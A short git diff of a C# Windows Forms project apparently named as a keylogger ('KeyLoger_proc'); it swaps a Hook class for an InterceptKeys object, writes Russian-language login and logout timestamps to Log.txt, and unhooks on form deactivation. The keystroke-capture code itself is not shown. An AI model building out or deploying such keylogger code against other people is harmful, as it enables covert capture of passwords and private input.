@@ -14,6 +14,7 @@ namespace KeyLoger_proc
     public partial class Form1 : Form
     {
         public static StreamWriter write;
+        public static InterceptKeys key;
         public Form1()
         {
             InitializeComponent();
@@ -24,15 +25,15 @@ namespace KeyLoger_proc
             FileStream fs;
             fs = new FileStream("Log.txt", FileMode.Append, FileAccess.Write);
             write = new StreamWriter(fs);
-          Hook h = new Hook();
-            h.SetHook();
-            
+             key = new InterceptKeys(""); ;
+           
+            write.WriteLine("Выполнен вход  " + DateTime.Now.ToString());
         }
 
         private void Form1_Deactivate(object sender, EventArgs e)
         {
 
-            
+            key.Unhook();
             write.WriteLine("Выполнен выход  " + DateTime.Now.ToString());
             write.Close();
         }
